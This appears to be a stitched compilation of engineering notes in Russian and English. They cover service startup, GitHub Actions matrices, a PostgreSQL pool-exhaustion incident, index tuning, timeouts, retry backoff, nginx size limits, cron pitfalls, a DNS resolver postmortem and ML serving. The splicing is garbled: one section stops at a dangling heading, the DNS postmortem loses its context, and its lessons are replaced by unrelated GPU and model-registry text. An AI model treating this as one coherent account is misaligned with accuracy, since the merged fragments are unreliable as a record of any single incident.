   Каждый сервис собирается и запускается командами из общего файла задач, так что не нужно помнить особенности каждого. Сервис поиска товаров запускается так, и это хорошая проверка, что всё окружение работает:
   
   ```sh
   make run SERVICE=catalog-search
   ```
   
   После запуска откройте страницу проверки состояния сервиса, она покажет статус подключения к каждой зависимости. Если какая-то зависимость недоступна, сервис всё равно запустится, но будет работать в деградированном режиме и напишет об этом в журнал. Это сделано специально: так проще разрабатывать функции, которые не трогают недоступную зависимость. Однако помните, что в тестовом окружении деградированный режим вызывает алерт, и если вы видите его там после своего изменения, это повод разобраться, а не игнорировать.
   
   ##### Конфигурация

# GitHub Actions: matrix strategy notes

We test the library on three operating systems and four interpreter versions. Writing twelve
jobs by hand is silly, so `strategy.matrix` expands one job definition into the cartesian
product of the axes.

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      max-parallel: 6
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        python: ["3.10", "3.11", "3.12", "3.13"]
        exclude:
          - os: macos-latest
            python: "3.10"
        include:
          - os: ubuntu-latest
            python: "3.13"
            coverage: true
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python }}
```

- **Quote version numbers.** YAML reads `3.10` as the float `3.1`. Our first matrix silently
  tested 3.1, which setup-python rejected with a confusing "version not found" message.

# Incident: database connection pool exhausted

Symptoms: API latency jumped from 150 ms to the 30 s request timeout, logs full of
`timeout waiting for connection from pool` (HikariCP says `Connection is not available,
request timed out after 30000ms`). The database itself was at 15 % CPU and looked healthy.

## What happened

A new feature called a third-party fraud-check API **inside** a database transaction. The
external call took 2–8 s under load. Each request held a pooled connection for the whole time,
the pool of 20 connections per instance drained, and every other request queued behind it.

Meanwhile, `pg_stat_activity` showed dozens of sessions in `idle in transaction`: connected,
transaction open, doing nothing.

```sql
SELECT state, count(*), max(now() - xact_start) AS oldest
FROM pg_stat_activity
WHERE datname = 'shop'
GROUP BY state;
```

## Fixes

- Moved the external call outside the transaction: read, call, then open a short transaction
  to write the result.
- `idle_in_transaction_session_timeout = '30s'` on the database role, so a leaked transaction
  gets killed instead of holding locks and a connection forever.
- A pool acquire timeout of 2 s instead of 30 s. Failing fast frees the request thread and
  surfaces the problem in metrics within seconds.
- Metrics on pool usage: active, idle, pending threads, acquire time. Alert when pending > 0
  for several minutes.

## Sizing the pool

Bigger is not better. PostgreSQL forks a process per connection, and throughput peaks at a
small number of active connections, roughly a few per CPU core. With 30 app instances × 20
connections we had 600 potential connections against `max_connections = 500`; a deploy that
doubled instances briefly caused `FATAL: sorry, too many clients already`.

Better: smaller per-instance pools and PgBouncer in transaction mode in front of the database,
which multiplexes thousands of client connections onto a few dozen server connections. Note
that transaction mode breaks session state: session-level `SET`, advisory locks and, in older
PgBouncer versions, named prepared statements.

# Index tuning on the orders database: notes from a month of query work

The orders database had accumulated indexes the way old houses accumulate furniture: each one was added for a reason, nobody remembered most of the reasons, and getting rid of any of them felt risky. At the start of this work the main orders table had twenty-three indexes, the table itself was 410 GB and its indexes together were 690 GB, and write latency for order updates had crept up by about forty percent over a year. At the same time, a handful of read queries were still slow despite all those indexes. These notes describe how we found which indexes were useful, which ones were missing, what we dropped and added, and the traps we ran into along the way. They are specific to PostgreSQL, but most of the reasoning applies elsewhere.

#### Finding out what is used

##### Index usage statistics

PostgreSQL counts how many times each index has been scanned since statistics were last reset. That counter is the starting point, but on its own it is misleading in two ways. First, statistics are per server, so an index that is never used on the primary may be used heavily on a replica that serves reporting queries; we had to collect the counters from every replica as well. Second, the counter does not tell you why an index was used, and an index that is scanned a million times a day might be used by a query that would run just as well with a different index. Run this on each server to see indexes on a table with their scan counts and sizes:

```sql
SELECT indexrelname, idx_scan, pg_size_pretty(pg_relation_size(indexrelid)) AS size
FROM pg_stat_user_indexes
WHERE relname = 'orders'
ORDER BY idx_scan ASC, pg_relation_size(indexrelid) DESC;
```

We reset nothing and collected the counters every day for four weeks from the primary and all four replicas, so that monthly jobs and end-of-month reporting would be included. Seven of the twenty-three indexes had zero scans on every server over the whole period. Four more had fewer than a hundred scans per day in total, all from a single internal admin page.

###### Query statistics

To understand which queries used which indexes, we used the statement statistics extension, which aggregates execution counts and timings per normalized query. For the top two hundred queries by total execution time, we ran an explain of a representative example and recorded which indexes the plan used. This was tedious, but it produced the map we needed: for every index, the list of queries that depended on it, with their frequency and cost. An index used by one query that runs once a day and takes ten milliseconds either way is not the same as an index used by the checkout path.

#### Dropping indexes

##### Duplicate and redundant indexes

Before looking at usage at all, we looked for indexes made redundant by others. An index on `(customer_id)` is redundant if there is also an index on `(customer_id, created_at)`, because the second can serve every query the first can, for equality on the leading column, at a small extra cost. We had three such pairs, plus one exact duplicate: two identical indexes on `(status)` with different names, one created by a migration in the application and one created by hand during an incident two years earlier and never removed. The duplicate alone was 18 GB.

###### Dropping safely

Dropping an index is instant and cannot be undone quickly: recreating a large index takes hours. So we did not drop unused indexes right away. Instead we first made them invisible to the planner, but PostgreSQL has no built-in invisible index feature, so we used a different trick for the first round. For each candidate, we ran the queries from our map that might plausibly use it, on a replica, inside a transaction that dropped the index first and rolled back at the end. Because the drop is transactional, the index is invisible to the planner inside that transaction and comes back intact on rollback. Example:

```sql
BEGIN;
DROP INDEX orders_status_created_at_idx;
EXPLAIN (ANALYZE, BUFFERS) SELECT ... ;
ROLLBACK;
```

This is safe on a replica only in the sense that it is not possible: you cannot run DDL on a physical standby. We actually ran these tests on a restored copy of the production database that was otherwise idle, with production query parameters taken from the statement statistics. On the real primary, a transactional drop takes an exclusive lock on the table until rollback, which would block all writes, so it must never be done there. Eleven indexes passed this check, with no plan in our map changing for the worse, and we dropped them on the primary one at a time over two weeks, using the concurrent form of drop to avoid blocking writes, and watching query latency between each drop.

#### Adding indexes

##### The slow queries

With the unused indexes gone, we turned to the queries that were still slow. Three accounted for most of the problem. The first was the customer order history page, which fetched the most recent orders for a customer, sorted by creation time, excluding cancelled orders. The second was a warehouse query that found orders in a given status for a given warehouse, older than a cutoff, to detect stuck orders. The third was a reporting query that summed order totals per day for a date range and a sales channel.

###### Partial indexes

The order history query filtered out cancelled orders, which are about eight percent of all orders, and sorted by creation time. The existing index on `(customer_id, created_at)` could serve it, but the executor then had to filter out cancelled rows, and for customers with many cancelled orders it read far more rows than it returned. A partial index that excludes cancelled orders is smaller and returns exactly the rows the query needs in the right order. Because the condition in the index must match the query's condition for the planner to use it, we also changed the query to use exactly the same expression. Example of the index:

```sql
CREATE INDEX CONCURRENTLY orders_customer_recent_active_idx
ON orders (customer_id, created_at DESC)
WHERE status <> 'cancelled';
```

The warehouse query was a better fit for a partial index still. It looks only for orders in three intermediate statuses, which at any moment are less than one percent of the table, because almost every order eventually reaches a final status. A partial index on `(warehouse_id, status, updated_at)` restricted to those three statuses was about 300 MB, compared to tens of gigabytes for a full index on the same columns, and the query went from around four seconds to under ten milliseconds. The interesting thing about this index is that it stays small forever: rows enter it when an order reaches an intermediate status and leave it when the order moves on, so its size tracks the number of orders in flight, not the size of the table.

##### Covering indexes

The reporting query read a large number of rows by date and channel and summed the totals. The existing index on `(channel, created_at)` found the right rows, but for each one the executor had to visit the table to read the total, and those visits were random reads across 410 GB. Adding the total as an included column turned the plan into an index-only scan, which reads only the index and the visibility map. Index-only scans depend on the visibility map being up to date, which depends on vacuum: on pages that changed since the last vacuum, the executor still has to visit the table to check visibility. Since most orders older than a few days never change, the visibility map for old data stays clean and the query benefits fully, while for the most recent days it partly falls back to table visits. The query went from about forty seconds to two seconds for a typical month-long range.

###### Building indexes without downtime

All new indexes were built with the concurrent option, which does not block writes but takes longer and can fail, leaving an invalid index behind. One of our builds failed after six hours because of a unique violation that appeared while the index was being built, on an index we had believed was safe to make unique. The invalid index stayed in place, consuming space and slowing writes, until we dropped it. We now check for invalid indexes after every concurrent build:

```sql
SELECT indexrelid::regclass FROM pg_index WHERE NOT indisvalid;
```

#### Measuring the result

We compared the four weeks before and after the work. The orders table now has fifteen indexes instead of twenty-three, and their total size dropped from 690 GB to 410 GB. Median write latency for order updates fell by about thirty percent, and the 99th percentile by more, because fewer indexes meant fewer random writes during peak periods. WAL volume dropped by about a fifth, which also reduced replication lag on the replicas during bulk updates. The three slow queries are now fast, and none of the queries in our map got slower beyond noise. Storage costs went down too, though that was never the goal: the reduction in index size freed enough space on the primary that a planned disk expansion was postponed by a year. Backup duration also shrank, since physical backups copy indexes along with tables, and the nightly full backup of the orders database now finishes about ninety minutes earlier than before. On a different note, the work also exposed a monitoring gap: we had no dashboard showing index sizes over time, so the growth from 400 GB to 690 GB over two years had gone unnoticed. Index and table sizes per database are now on the storage dashboard, with a weekly trend line and an annotation for every migration that adds or drops an index.

##### Write amplification in numbers

It is worth spelling out why dropping indexes helped writes so much. Every update to an order that changes an indexed column, or that cannot be done as a heap-only tuple update because the page is full, requires an insertion into every index on the table. With twenty-three indexes, a single status change meant up to twenty-three index insertions, each a random write to a different part of the disk. Reducing the number of indexes and lowering the fill factor of the table to leave room for heap-only updates together raised the share of heap-only tuple updates from about thirty percent to over seventy percent, which is where most of the write latency improvement came from.

###### Fill factor

Lowering the fill factor of an existing table only affects pages written after the change, so to benefit from it for existing data we had to rewrite the table, which on 410 GB is not something you do casually. We used an online repacking tool that rebuilds the table in the background and swaps it in at the end with a brief lock. The rewrite took about nine hours on a weekend and needed roughly as much free disk space as the table itself, which we had to provision in advance.

#### Keeping it this way

The main risk now is drift: indexes get added during incidents or for one-off reports and never removed. We added three safeguards. Every index on the large tables must be created by a migration in the repository, with a comment naming the query it supports; a weekly job reports indexes that exist in the database but not in the migrations. A monthly job lists indexes with zero scans across all servers over the past thirty days and opens a ticket for review. And the review checklist for migrations that add an index on the orders table now asks for the explain output of the target query before and after, run against a recent production-sized copy rather than a development database, because plans on small data are often completely different from plans on real data.

# Таймауты во внешних вызовах: какие бывают и почему «без таймаута» — это баг

У HTTP-клиента в большинстве библиотек по умолчанию таймаута нет вовсе (requests в Python,
`http.Client` в Go с нулевым `Timeout`) или он огромный. Зависший апстрим тогда держит
поток или соединение из пула бесконечно, и сервис падает не от ошибок, а от исчерпания ресурсов.

Что задаём всегда, отдельно:

- **connect** — установка TCP/TLS. Короткий, 1–3 с: если хост недоступен, ждать дольше бессмысленно.
- **read / response** — ожидание ответа после отправки запроса. Подбирается по p99 апстрима
  с запасом, а не «на всякий случай 60 с».
- **общий дедлайн запроса** — верхняя граница на всю операцию, включая повторы.

Дедлайн передаём вниз по цепочке: если у входящего запроса осталось 800 мс, исходящий
вызов не должен ждать 5 с. В gRPC это делается штатно (deadline в контексте), в HTTP — своим
заголовком с оставшимся бюджетом.

Таймаут прокси (`proxy_read_timeout` у nginx) должен быть больше таймаута приложения, иначе
клиент получит 504, а бэкенд продолжит работу впустую.

# Повторы запросов: экспоненциальная задержка, джиттер и бюджет повторов

После инцидента, где упавшая на минуту база превратилась в получасовой простой. Каждый
из 40 экземпляров сервиса повторял неудачный запрос сразу и до 5 раз, а клиенты снаружи тоже
повторяли. Когда база поднялась, на неё пришла волна в десятки раз больше обычной нагрузки,
и она легла снова. Это и есть шторм повторов (retry storm).

## Когда повторять

- Только идемпотентные операции: GET, PUT, DELETE, или POST с ключом идемпотентности
  (`Idempotency-Key`), который сервер запоминает.
- Только временные ошибки: таймаут соединения, сброс, HTTP 502/503/504, 429. Ответ 400, 401,
  404, 409 повтором не лечится.
- Если сервер прислал `Retry-After` — уважать его.

## Экспоненциальная задержка с джиттером

Задержка растёт как `base * 2^attempt` с потолком. Без случайности все клиенты, упавшие
одновременно, и повторяют одновременно — синхронные волны. Вариант «full jitter»
выбирает задержку равномерно от нуля до текущего потолка:

```python
import random, time

def backoff_delays(base=0.1, cap=10.0, attempts=5):
    for n in range(attempts):
        yield random.uniform(0, min(cap, base * 2 ** n))

def call_with_retries():
    for delay in backoff_delays():
        try:
            return call_upstream()
        except TransientError:
            time.sleep(delay)
    raise UpstreamUnavailable()
```

Есть и «equal jitter» (половина фиксированная, половина случайная) и «decorrelated jitter»,
но full jitter прост и на практике распределяет нагрузку лучше всего.

## Бюджет и границы

- Повторять на одном уровне стека. Если повторяют и клиент, и шлюз, и сервис — 3 × 3 × 3 =
  27 запросов на одну операцию пользователя.
- Бюджет повторов: не больше ~10 % от числа обычных запросов за окно. Когда бюджет
  кончился — сразу ошибка, без повторов.
- Повторы укладываются в общий дедлайн запроса: сумма задержек и попыток не превышает его.
- Предохранитель (circuit breaker): при высокой доле ошибок перестать звать апстрим на
  время и отдавать ошибку или запасной ответ сразу.

## Что поменяли

Убрали повторы из внутреннего SDK (оставили в шлюзе), поставили full jitter с потолком
5 с и бюджет 10 %. На следующем отказе базы восстановление заняло секунды.

# Пределы размера запросов на входе

Размер тела запроса ограничен на каждом звене цепочки: балансировщик, nginx, сервис. Лимиты
нужны, чтобы один клиент не занял диск и память прокси огромной загрузкой.

## Текущие значения

Общий предел nginx — 10 МБ (`client_max_body_size 10m` в блоке `http`). Маршрут загрузки
частей файлов `/upload/parts/` разрешает 64 МБ, остальные маршруты API — значение по
умолчанию. Балансировщик ограничивает тело 100 МБ.

## Буферизация

Тело больше `client_body_buffer_size` nginx пишет во временный файл в
`client_body_temp_path`. Каталог вынесен на отдельный раздел с запасом места, чтобы загрузки
не заполняли корневой раздел.

## Где менять

Предел маршрута меняется в его `location` в репозитории конфигурации шлюза и выкатывается
обычным релизом. Ручные правки на серверах затираются при следующем развёртывании.

## Проверка

После изменения лимита запускается проверка: загрузка файла на 1 МБ меньше предела проходит,
на 1 МБ больше — получает отказ.

# crontab: почему задача работает руками и молчит по расписанию

Короткий список того, на что я наступал с cron, чтобы не искать заново.

- **Окружение почти пустое.** У cron свой `PATH` (обычно `/usr/bin:/bin`), нет переменных
  из `.bashrc` и `.profile`. Скрипт, который вызывает `node` или `aws` из `/usr/local/bin`,
  падает с «command not found». Решение: абсолютные пути или строка `PATH=...` в начале
  crontab.
- **Знак `%` — перевод строки.** В строке crontab `%` превращается в newline, всё после
  первого `%` уходит на stdin команды. `date +%F` нужно писать как `date +\%F`.
- **Вывод.** stdout и stderr уходят письмом на `MAILTO`; если почта не настроена, вывод
  теряется. Пишите в журнал явно: `... 2>&1 | logger -t backup`.
- **Последняя строка без перевода строки** игнорируется некоторыми реализациями.
- **Наложение запусков.** cron не знает, что прошлый запуск ещё идёт. Оборачиваю в
  `flock -n /run/lock/backup.lock команда`.
- **Файлы в `/etc/cron.d/`** имеют лишнее поле пользователя и не должны содержать точку
  в имени — на Debian `run-parts` пропускает такие файлы.
- **Часовой пояс** — системный; после смены пояса перезапустить сервис cron.

This is a blameless postmortem: the goal is to understand how the system allowed a routine change to cause a large outage, not to find someone to blame. Times are in UTC and come from the incident channel, resolver metrics and change logs.
   
   #### Summary
   
   A configuration change to the internal resolvers, intended to add a forwarding zone for a newly acquired company's domain, was rolled out to all resolver instances at once. The change itself affected one obscure zone, but the failure mode turned it into an outage for everything.
   
   #### Background

   Internal resolution is handled by a fleet of twelve recursive resolvers spread across three regions. The stub caches answers for up to the record's time to live, with a cap of five minutes, and retries the second resolver if the first does not answer within two seconds. Authoritative data for internal zones lives on a separate set of authoritative servers, and the resolvers forward internal zones to them. Queries for public names are resolved recursively from the root.

The tunnel terminated in one of our three regions. The change added a conditional forwarder for that zone to the resolver configuration, pointing at the acquired company's servers. In the region with the tunnel, those servers were reachable and the change worked. In the other two regions there was no route to them at all, so packets to them were silently dropped by the network rather than rejected, and every forwarded query waited for the full forwarding timeout before failing.

   When the GPU pool is unavailable or saturated, search falls back to serving without reranking, which costs a few points of relevance but keeps search working. We also built a CPU fallback for the cross-encoder using a quantized int8 version of the model, which runs within the latency budget only for the top twenty results instead of forty. In an exercise where we drained all GPU nodes in one zone during peak, the fallback served that zone's traffic for twenty minutes with a relevance drop that was barely visible in online metrics, which gave us confidence that a GPU outage is an inconvenience and not an emergency.
   
   ##### Model registry hygiene
   
   The registry holds every model version that was ever registered, with its training data reference, evaluation results, export artifacts and the serving configuration it was validated with. Early on, the registry also held about four hundred versions that had never been deployed, because every training run registered its output automatically. We changed registration to an explicit step that requires passing the offline evaluation thresholds and the skew check, and archived versions that have not been served in ninety days. The serving platform refuses to load an archived version without an explicit override, which prevents a configuration mistake from pointing production at a model trained a year ago.
   
   #### Lessons
   
   Most of our serving problems were not about models. They were about cold starts, about features computed in two places, about resource usage that only showed up at full scale, and about the operational differences between frameworks. Standardizing on one model server and one export format removed a whole category of problems. Logging serving-time features removed most of the skew. Shadow mode removed surprises about resource usage. What remains hard is the latency budget: each new model generation is a little bigger than the last, and every quarter we have the same negotiation between the gain in offline metrics and the milliseconds the product teams are willing to give.
